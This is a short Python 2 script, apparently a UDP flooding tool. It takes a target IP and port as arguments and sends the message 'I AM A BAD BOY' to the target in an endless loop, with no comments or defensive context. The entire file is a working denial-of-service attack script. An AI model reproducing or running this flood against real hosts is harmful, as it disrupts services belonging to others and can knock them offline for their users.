#!/usr/bin/python
import socket
import sys
 
def send_traffic(ip, port):
     print "Sending burst to " + ip + ":" + str(port)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.connect((ip, port))
     while True:
         sock.send("I AM A BAD BOY") 
 
if len(sys.argv) != 3:
     print "Usage: " + sys.argv[0] + " IP PORT"
     sys.exit() 
 
send_traffic(sys.argv[1], int(sys.argv[2]))
